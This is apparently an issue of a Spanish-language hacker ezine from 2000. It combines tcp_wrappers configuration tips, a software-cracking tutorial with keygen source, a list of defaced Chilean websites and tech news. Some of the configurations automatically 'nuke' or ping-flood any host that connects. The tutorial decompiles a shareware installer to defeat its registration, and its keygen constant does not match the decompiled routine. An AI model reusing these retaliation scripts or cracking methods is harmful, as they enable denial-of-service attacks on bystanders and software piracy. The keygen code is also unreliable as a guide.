#/etc/hosts.allow 	   # Con esta wea NADIE de puede conectar a NINGUN puerto
ALL: ALL: deny 		   # de tu PC. Aunke sea lo mas seguro no es lo mejor.

#/etc/hosts.allow 	   # Cerrado para todos
ALL: 127.0.0.1 		   # exepto conexiones
ALL: ALL: deny 		   # locales.

#/etc/hosts.allow 	   # 
ALL: 127.0.0.1 		   # Conexi"n local total,
in.telnetd in.ftpd: LOCAL  # red local acceso por telnet y ftp,
ALL: ALL: deny 		   # resto cerrado

#/etc/hosts.allow 						# Mensaje en pantalla mostrando
ALL: ALL: twist ( /usr/bin/echo -e "Intruso %a en puerto %d" ) 	# su host y a k puerto (demonio).

#/etc/hosts.deny
ALL: ALL EXCEPT LOCAL: twist (echo "Acceso a %d desde %h" \	# Manda un mail al root con el 
| mail root -s "Acceso Ilegal")&				# subjet "acceso ilegal" y en el
								# body el deamon y nombre cliente
								# a menos k la conex. sea local.


Ayuda para una mente abierta.
-----------------------------
Si eske eri un weon con imaginacion, ya sabes k scripts debes hacer.
Pero si no lo eri, aki van algunas weas buenas.

#/etc/hosts.deny						# Te avisa de un acceso
ALL: ALL EXCEPT LOCAL: twist (echo "Intruso en %d desde %a" \	# y desconecta al host de
> /dev/tty00 | ping -l 65500)					# internet con un ping.

#/etc/hosts.allow 
ALL: LOCAL: spawn ( echo -e "Acceso autorizado de %a por %d" ) & 		# Un script
ALL: PARANOID: twist ( echo -e "ATACANTE %a por puerto %d, lanzando nukes" \ 	# super completo.
; /usr/local/bin/nukes.sh %a ) & 						# Ke ataca con
ALL: UNKNOWN: twist ( echo -e "Posible nuke o scan de %a en %d" \		# nukes al k se
; /usr/local/bin/nukes.sh %a) & 						# conecta a tu PC
ALL: ALL: twist ( /bin/echo -e "INTRUSO! %a, usando puerto %d" \		
; /usr/local/bin/nukes.sh %a) &		

#/etc/hosts.deny
ALL: ALL EXCEPT LOCAL: twist (echo "ATACANTE %a por puerto %d" > /dev/tty00) & 	# Mensaje a la
										# pantalla.


------------------------------------------------------------------------------

Tambien   puedes  hacer  un  script k okupe algun sintetizador de voz, como el
festival, y k te diga verbalmente lo k okurre en tu computador.

Como puedes ver hay muchas weas k podi hacer.


Limitaciones.
-------------
Este   sistema   aunque   es  muy  facil y completo tiene algunas limitaciones,
algunas sencillas de solucionar otras no tanto:

Solo cubre servicios definidos en el archivo inetd.conf por ejemplo no informa
de ningun intento de acceso por el puerto del BO, NetBUS... ni otros servicios
como printer o X que no usan inetd.conf para configurar sus conexiones.

No  detecta  algunos tipos de conexion: por ejemplo los pings, algunos stealth
scan ...

La solucion es usar algun sistema de "escucha" mas fino, como el tcpdump.
Las lineas de los archivos hosts.allow y hosts.deny no deben  contener  saltos
de linea:

O usas un editor que no rompa las lineas largas o pones un backslash (\) 
antes de cada salto de linea.

La fucking despida.
-------------------
Ya cabros, hasta algun proximo articulo,  la  informacion k sake de aki fue de
algunas paginas web, la revista "Solo Linux N. 5" y conocimiento general.
Si keri mandar alguna wea haslo a: fonzkiller@fonzkiller.8m.com
SHAO.



-[09. Tutorial de Cracking Basico N"1]-------------------------[by HoLLoWmAn]-

 ________________________________________
   |_|  _  |   |   _  |  |  |\/|    
   | | |_| |_  |_ |_| |/\|  |  | /| |\|
 ---------------------------------(c)----

 Tutorial de Cracking Basico N>1 por -= HoLLoWmAn =-
  "Programas en VB 3.0 (algo viejo pero pa empezar sirve)"

Indice:
 1. Introduccion
 2. Materiales
 3. Proceso
 4. Links Relacionados  

-1. INTRODUCCION:

       Primero tienes que saber lo que hace y es un descompilador pues  es  la
       herramienta principal para  la   ingenieria inversa,  ademas   de   los
       descompiladores existen los desensambladores, la diferencia es que  los
       descompiladores traducen el codigo de maquina a lenguaje de  alto nivel
       (mas "lejano" del procesador) y los desensambladores  a ensamblador que
       es lo mas cercano a codigo de maquina,(algunos piensan  que  el asm  es
       codigo de maquina pero no lo es.).
       Los Debugger son como desensambladores,pero con la diferencia que estos
       corren en tiempo de ejecucion, ademas puedes ver todos los  registros y
       hasta parchar en memoria algunos programas, aunque su objetivo original
       es el de corregir programas hechos por ti mismo.

-2.MATERIALES:

# Visual Basic 3.0 en adelante 
 
# DoDi's VbDis para VISUAL BASIC 3.0 
 
* WinSchema 98' (ver links)
 
* WinCircuit 2000' (")
 
# Conocimientos basicos de VISUAL BASIC 
 
# Mosica de Fondo: Sonata Arctica, o KoRn.

# Cerebro: Protozoo 
 
-------------
| * victima |
-------------

-3.PROCESO DE CRACKEO:

Bueno  empecemos,   el  WinShema   sirve  pa' hacer esquemas electronicos y de
agua,  y el otro pa' hacer circuitos impresos,   si  no sabes lo  que  es   no
importa igual sirve para hacer una breve introduccion  al  Cracking.   Primero
descomprime el Wcircuit.zip a cualquier carpeta,  pero   que este vacia, da lo
mismo en realidad, y ejecuta el vbdis3e.exe  no   pesques el mensaje  que   no
esta  el   Visual   Basic   y   "file,open",  andate  a  la    carpeta   donde
descomprimiste el wincircuit  selecciona   el  install.exe  y  crea una  nueva
carpeta desde el dialogo, espera  a  que  salga  un  msgbox "now save forms as
text" y cierra el  descompilador   andate a la carpeta que creaste.    Abre el
archivo que se llama enreg.bas, que dice algo asi (estracto):

Sub sub5E0 ()
Dim l0036 As String
Dim l0038 As Variant
Dim l004E As Variant
gv0024 = 0
l0036$ = UCase$(Text1.Text)
For l0038 = 1 To Len(l0036$)
If Asc(Mid$(l0036$, l0038, 1)) > 32 Then gv0024 = gv0024 + Asc(Mid$(l0036$, l0038, 1))
Next
gv0024 = gv0024 + 1234
gv0024 = gv0024 * 33
If Val(Text2.Text) = gv0024 Then
gv000A = "Valide"

Ahora siente el codigo, como dicen los buenos crackers, por conclusion sacamos
que la variable gv0024 es el codigo valido para registrarnos, ahora solo queda
acernos  un  keygen, abre el Visual Basic crea un nuevo proyecto  exe colocale
unos 2 textboxes y unos cuantos botones, y aqui te va el codigo de mi KeyGen:

------------------------------- Cortar aqui ----------------------------------
                                                    
Option Explicit

Sub Command1_Click()
sub5E0
End Sub

Sub sub5E0()
Dim l0036 As String
Dim l0038 As Long
Dim gv0026 As Long
gv0026 = 0
l0036$ = UCase$(Text1.Text)
For l0038 = 1 To Len(l0036$)
If Asc(Mid$(l0036$, l0038, 1)) > 32 Then gv0026 = gv0026 + Asc(Mid$(l0036$, l0038, 1))
Next
gv0026 = gv0026 + 4321
gv0026 = gv0026 * 33
Text2.Text = gv0026
End Sub

Private Sub Command2_Click()
MsgBox "(c) HoLLoWmAn", , "Acerca..."
End Sub

------------------------------ Aqui Termina ----------------------------------

Como ves aqui, asi de facil es, ahora el WinShema te lo dejo
enteramente a ti, pero no te preocupes pues las subrutinas son
casi las mismas, y para comprobar como son de mulas las proteciones
de algunos sofwares, si ves la rutina de encriptacion es mas simple
de lo que aparenta, casi todas son las mismas solo cambias los
numeros por cuanto se multipica o divide ,asi pues nos hemos cagado
una proteccion hoy. Hasta la proxima sera pues, y gracias por leer
tan detenidamente mis comentarios estupidos.
como moraleja:
-No hagas programas en Visual Basic 3.0

Tips pa' los sin un Cobre:
- Te puedes hacer de un Visual Basic casi tan funcional como el Enterprise
  Edition, legalmente, bajandote el Visual Basic 5 Control Creation Edition,
  haces todo en controles ActiveX y con el programa pa' hacer instalaciones
  que incluye generas una pagina html la cual podras ver en el ms-ie 3.0 en
  adelante.

-4.LINKS:

---------
Archivos:
---------
  http://www.kagi.com/alain.michel/WSchema.zip
  http://www.kagi.com/alain.michel/WCircuit.zip
  dodi: pon en www.altavista.com "dodi vb discompiler" haber si no lo pillas

---------------
Mas Tutoriales:
---------------

-Estudio Colectivo de Desprotecciones:
  http://ecd.tsx.org



-[10. Noticias]--------------------------------------------------[by sdriLiO]-

# Recientes Crack's (Nueva Sub-Seccion)

URL                           Responsable          Fecha
----------------------------------------------------------------------------
http://www.peterveneno.cl     0wn3d                   10/09/2000
http://www.incap.cl           Kro8s                   15/09/2000
http://www.federalchile.cl    Kro8s                   15/09/2000
http://www.estudioaguayo.cl   Kro8s                   15/09/2000
http://www.educar.cl          Kro8s                   15/09/2000
http://www.info2000.cl        Kro8s                   15/09/2000
http://www.emaresa.cl         GengisKAN/Reep3r        18/09/2000


Asi es, una nueva sub seccion que encontraran en la ezine. 

Estos son sitios chilenos que recientemente han demostrado su seguridad, y los
buenos  admins  que poseen. Por ahora solo publicaremos  sitios chilenos, pero
esperamos poder extendernos al resto de America Central y Sur.


# AMAZON TRAICIONADA

Yahoo! dejo su asociacion con Amazon para pasarse a Barnes & Noble. No se
revelaron los detalles del acuerdo, que presumiblemente asegura a Yahoo! una
salida fuente de ingresos en momentos en que, según algunos expertos, la
publicidad en la red ya no es lucrativa.
Hasta la semana pasada cuando alguien buscaba informacion en Yahoo!, no solo
encontraba las direcciones correspondientes, sino tambien un enlace con los
libros sobre el tema pedido que estuvieran disponibles en Amazon.com.
A partir de ayer, los que utilicen el portal tendran el enlace con
Barnesandnoble.com, cuya propiedad mayoritaria pertenece a Barnes and Noble -
mayor vendedor de libros en Estados Unidos -  y la empresa editorial alemana
Bertelsmann AG.

El acuerdo dara a barnesandnoble.com una presencia prominente en varias paginas
de Yahoo!, como Yahoo! Shopping, con promociones de productos comerciales.
No se revelaron los detalles del acuerdo, que presumiblemente asegura a Yahoo!
una salida fuente de ingresos en momentos en que, segun algunos expertos, la
publicidad en el espacio cibernetico ya no es lucrativa. En el ultimo
trimestre, la publicidad represento un 90 por ciento de los ingresos de Yahoo!
en su ultimo trimestre.

La portavoz de Amazon, Lizzie Allen, dijo que la empresa con sede en Seattle
decidio no renovar su convenio con Yahoo!. En cambio, Amazon decidio en agosto
extender su asociacion con America Online, en un acuerdo que la portavoz
considero "mas atractivo por varias razones".


# EL "EFECTO NAPSTER"

La agencia Forrester Research calcula en 3,1 mil millones de dolares las
perdidas financieras anuales que las casas discograficas acusaran a partir
del 2005.

La musica gratis en Internet y la pirateria costaron caro a la industria
musical. En verdad, se calculan en 3,1 mil millones de dolares las perdidas
financieras anuales que las casas discograficas acusarán a partir del 2005,
en lo que ha sido definido "Efecto Napster".

Asi lo hace saber un informe de la Forrester Research, agencia norteamericana
de investigaciones sobre tecnologia, que ha localizado en la piratería, en
sitios Internet en los limites de la legalidad, como Napster, y en los
servicios de distribucion digital a los mayores adversarios de la industria
musical.

Segun Eric Scheirer, analista de la Forrester, los usuarios preferirin
cliquear en Napster o en programas similares, capaces de ofrecerles archivos
no protegidos y grandes ventajas, en lugar de recurrir a los servicios
descargables de las casas discograficas.

Scheirer tambien esta convencido de que la resolucion del proceso pendiente
sobre Napster, que se espera para el 2 de octubre, no cambiara la situacion.

"Considero que el hecho de encarcelar a los que usan Napster tendra un retorno
de imagen negativo para la industria musical, y por lo tanto sera
contraproducente", dijo el analista.

Mientras tanto, la Recording Industry Association of America, organo
norteamericano de la industria musical, hizo saber que se queria concentrar en
la persecucion de los 'piratas' de musica mas que en los usuarios.


# MAS ALLA DEL CD

La compa~ia japonesa Sony presento el Super Audio Disco Compacto (SCAD, en sus
siglas en ingles), un sistema cuya forma de grabacion permite ofrecer una
calidad de sonido muy superior a la de los discos compactos.
El fabricante japonés Sony, con el apoyo de otras quince compa~ias del sector,
ha presentado una nueva tecnologia para la distribucion de musica, durante
el Salon del Disco clausurado hoy en Paris.

Se trata del Super Audio Disco Compacto (SCAD, en sus siglas en ingles), un
sistema cuya forma de grabacion permite ofrecer una calidad sonora muy
superior a la de los discos compactos, informa en su edicion de hoy el
vespertino "Le Monde".

Segun el rotativo, "el sistema propuesto por Sony se fundamenta en una nueva
forma de grabacion (...) que garantiza una calidad sonora optima", aunque su
precio puede resultar "caro".

Entre los quince fabricantes que han apoyado el desarrollo del sistema SCAD
figuran firmas como Pioneer, Philips, Yamaha, Onkyo, Kenwood o Sharp, pero no
hay, de momento, elementos que permitan pronosticar la acogida que tendra el
nuevo formato.


# APPLE ANUNCIA VERSION BETA DEL MAC OS X

En el evento Apple Expo Paris, la empresa anuncio la disponibilidad de Mac OS
X Public Beta, la version beta publica del sistema operativo que Apple lanzara
al mercado el proximo a~o.

En la presentación inaugural de la Apple Expo de Paris, en la que más de 250
expositores muestran sus soluciones y servicios para la plataforma Macintosh,
Apple anuncio la disponibilidad de Mac OS X Public Beta y presento una nueva
linea de portatiles iBook con nuevos colores.

Apple ha anunciado tambien que ofrecera la tarjeta aceleradora grafica ATI
Radeon Graphics como opcion adicional, a traves de la Apple Store
(www.apple.com/es), para la gama de sistemas Power Mac G4 y Power Mac G4 Cube.

Mac OS X Public Beta esta disponible de inmediato en Ingles, Frances y Aleman
en The Apple Store (www.apple.com/es). Mac OS X está concebido a partir de
tecnologias software de vanguardia, incluyendo avanzadas tecnologias de
graficos e Internet, una nueva interfaz de usuario llamada "Aqua", y Darwin:
el nucleo del sistema basado en UNIX y con licencia open-source.

Mac OS X es un sistema operativo con capacidades de proteccion de memoria y
con capacidad de multiproceso simétrico cuando se utiliza con la nueva linea
de ordenadores Power Mac G4 con doble procesador.

El Mac OS X incluye el nuevo motor de graficos 2D de Apple denominado
"Quartz" (basado en el formato PDF ­Portable Document Format­ estándar en
Internet) y un amplisimo soporte de fuentes tipograficas; OpenGL para operar
con graficos y juegos 3D; y QuickTime para el streaming de audio y video.
Mas aun, el Mac OS X incorpora la nueva interfaz de usuario llamada "Aqua"
que combina facilidad de uso con innovaciones como el "Dock": un sistema
para organizar aplicaciones, documentos y ventanas miniaturizadas.

Mac OS X Public Beta incluye varias aplicaciones, entre las que se encuentran
un nuevo cliente de correo electronico (compatible IMAP y POP) y nuevas
versiones del player QuickTime y de la herramienta de busqueda en Internet
Sherlock, asi como una version beta del Internet Explorer de Microsoft.

Apple ha desvelado tambien hoy una nueva linea de ordenadores portatiles iBook
con puertos FireWire y con el programa iMovie 2: el software de edicion de
video digital. El nuevo iBook de Apple viene ahora en color Indigo, mientras
que el nuevo iBook Special Edition, que incorpora unidad de DVD-ROM para ver
peliculas DVD, se suministra en el color Graphite (Grafito). Adicionalmente,
y solo a través de The Apple Store (www.apple.com/es) tanto el iBook como el
iBook Special Edition se suministran en un nuevo y espectacular color: Key
Lime (Limon verde).

Los nuevos modelos de iBook incorporan un procesador PowerPC G3 a 366 MHz o
466 MHz; disco duro IDE de 10 GB (configurable con disco de hasta 20 GB);
puerto FireWire de 400 Mbps para conectar periféricos de alta velocidad como
camaras digitales y unidades de disco duro; unidad de CD-ROM o de DVD-ROM;
un puerto AV que proporciona salida de audio y salida de video compuesto; y
el velocisimo controlador grafico ATI RAGE Mobility 128 con 8 MB de SDRAM
para disfrutar de juegos y graficos.

Otro anuncio realizado hoy por Steve Jobs en su presentación de apertura de
la Apple Expo, es la disponibilidad del acelerador de gráficos 3D mas potente
para Macintosh: la tarjeta ATI Radeon Graphics. La adicion de la tarjeta
grafica Radeon supone que, a través de The Apple Store, el G4 esta ahora
disponible en mas de 90.000 configuraciones "a medida" diferentes, y el G4
Cube en más de 2.000 configuraciones distintas.


# NACE EL "LINUX LAB"

IBM, Hewlett-Packard, Intel y NEC proveerán equipos y financiamiento para la
creacion de un laboratorio que permitira a los desarrolladores de la
plataforma Linux crear productos dirigidos especialmente a las empresas.

Desde su Linux Lab en Portland Oregon, surgirán los productos que comenzarán
a desarrollar IBM, Hewllett Packard, NEC e Intel, para esta plataforma, segun
anunciaron estos cuatro "gigantes".

El laboratorio, actualmente en construccion, entregara a los desarrolladores
de fuente abierta un entorno empresarial centralizado para compartir ideas e
innovaciones, segun comunica la International Business Machines (IBM).

La cooperacion es un proyecto a largo plazo que incluye entre sus afiliados,
ademas del cuarteto gestor, a empresas como Dell, Linuxcare, LynuxWorks,
Red Hat, SGI, SuSE, TurboLinux y VA Linux, las cuales no estaran preocupadas
de la generacion de nuevos productos, sino que buscaron potenciar y acelerar
el desarrollo de las aplicaciones ya existentes con el objeto de adecuarlas
para el mercado corporativo, área a la que apunta este pacto de colaboracion.

El manejo de este nuevo organismo, inscrito como una organizacion sin fines
de lucro, estara a cargo de un directorio independiente, compuesto por
personas ligadas a la comundidad de promocion de los codigos abiertos, asi
como por reperesentantes de las empresas que patrocinan la investigacion.

Ross Mauri, vice presidente de UNIX Software para IBM se~alo que
"el desarrollo de Linux esta creciendo de manera firme y sostenida. El
laboratorio pondrá recursos en manos de los desarrolladores para ayudarlos
a transformar sus proyectos en soluciones de alta calidad destinadas a las
empresas".

# MICROSOFT QUIERE ESTAR EN TODAS:
  DESARROLLAN WINDOWS MEDIA Y EXPLORER PARA LINUX

Una pequeña empresa californiana desarrolla versiones para Linux de los
softwares Internet Explorer y Windows Media Player. Segun diversos medios,
una nueva jugada de la firma de Gates para conquistar el mundo.

Las versiones sobre la alianza entre Microsoft y Mainsoft que circularon en
la industria informatica y recogidas por el sitio WinInfo, fueron confirmadas
por la propia Mainfsoft.

Mainsoft difundio que concluyo un contrato con Microsoft para hacer compatible
con los sistemas Unix el programa de navegacion Internet Explorer y el
programa para distribuir audio y video para computadores Windows Media Player.

Segun los analistas, no esta claro por qué Microsoft, renuente a compartir
glorias y ganancias, acepto la alianza con Mainsoft.

A menos que, sugiere el titular de WinInfo, Paul Thurrott, Mainsoft no haya
considerado conveniente hacer de cabeza para una penetracion estrategica y
bien planificada de Microsoft en el sector Unix.

Segun Thurrott, que basa sus afirmaciones en las revelaciones de un
programador israeli que trabaja para Gates, Microsoft no quiere poner Unix en
su propio motor.

No es de excluir, comentaron analistas del sector, que a la larga esta
estrategia de Microsoft sea una especie de caballo de Troya.

El mismo programador israeli sospecha que Microsoft intenta usar Linux como
"punto de contacto con Windows" para poder hacer "como hizo con el programa
office de Macintosh", en base al último axioma anticompetencia: "si no puedes
contra ellos, cometelos", que reemplazo al ya obsoleto "si no puedes contra
ellos, unete a ellos".


# NUEVA VERSION DE LINUX

Segun su creador, Linus Torvalds, esta nueva versión sera mas operativa en
los ordenadores de alta gama, especialmente en los que comprenden mas de un
procesador, lo que va a reforzar su competitividad frente a Windows.

La nueva version -primera en a~o y medio- saldra con varios meses de retraso
sobre el plan original de sus programadores, cuyo trabajo es coordinado por
Torvalds.

Torvalds agrego que haran falta unos 5 a 10 años para que Linux sea tan
popular como Windows o Macintosh de Apple en cuanto a los PCs.
"Windos sigue siendo mas simple para la mayoria de las personas", comento.

Los usuarios en las empresas, en cambio deberian comenzar a usar Linux mas
pronto.


-[11. Shutdown]------------------------------------------------------[by NKZ]-

Y asi hemos concluido la 4ta entrega de NoKeyZ, esperamos tus comentarios sobre
de esta, ezine@nokeyz.net,  tambien tus criticas, saludos, etc.

Nos vemos en NoKeyZ 5. 
Bye
Astalavista
Ciao
